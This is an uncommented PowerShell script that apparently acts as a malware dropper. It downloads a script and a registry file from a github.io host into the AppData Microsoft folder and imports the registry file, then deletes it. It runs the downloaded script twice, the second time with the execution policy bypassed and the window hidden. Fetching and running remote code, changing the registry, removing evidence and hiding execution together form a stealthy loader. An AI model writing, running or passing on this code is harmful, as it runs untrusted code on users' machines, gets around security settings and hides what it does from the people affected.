$p = [System.Environment]::GetFolderPath('ApplicationData')

Invoke-WebRequest -Uri 'https://lo9wroc.github.io/pr.ps1' -OutFile "$p\Microsoft\pr.ps1"

Invoke-WebRequest -Uri 'https://lo9wroc.github.io/pr.reg' -OutFile "$p\Microsoft\pr.reg"

reg import "$p\Microsoft\pr.reg"

Remove-Item "$p\Microsoft\pr.reg"

Start-Process powershell.exe -ArgumentList "-NoProfile -File `"$p\Microsoft\pr.ps1`""

cmd.exe /c start /min "" powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\Microsoft\pr.ps1"
